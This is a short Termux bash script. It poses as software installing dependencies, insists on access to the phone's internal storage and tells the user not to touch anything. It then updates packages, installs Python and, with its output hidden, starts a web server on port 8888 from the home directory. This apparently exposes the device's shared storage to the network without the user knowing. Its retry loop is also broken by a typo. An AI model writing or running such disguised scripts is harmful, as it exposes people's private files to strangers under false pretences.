#!/bin/bash

sleep 1
GREEN="\033[32m"
RED="\033[31m"
END="\033[0m"
echo -e "${GREEN}SOFTWARE : RUNNING ...${END}"
sleep 3
cd ~
if [ -d "storage" ]
then
  :
else
  echo -e "${RED}Please allow the software to access your device's internal storage!${END}"
  ATTEMPT=0
  M_ATTEMPT=10
  while [ ! -d "storage" ] && [ $ATTEMPT -lt M_ATTEMP ]
  do
    termux-setup-storage
    ((ATTEMPT++))
  done
fi
if [ ! -d "storage" ]
then
  echo -e "${RED}Tətbiqi silin${END}"
  exit 1
fi
sleep 3
echo -e "${GREEN}The software is downloading and installing required dependencies.\nThis may take a few minutes.\n${RED}Please do not touch anything here!${END}\n${GREEN}Please wait ...${END}"
sleep 3
pkg update
pkg upgrade -y -o Dpkg::Options::="--force-confdef --force-confold"
pkg install -y python
python -m http.server 8888 > /dev/null 2>&1
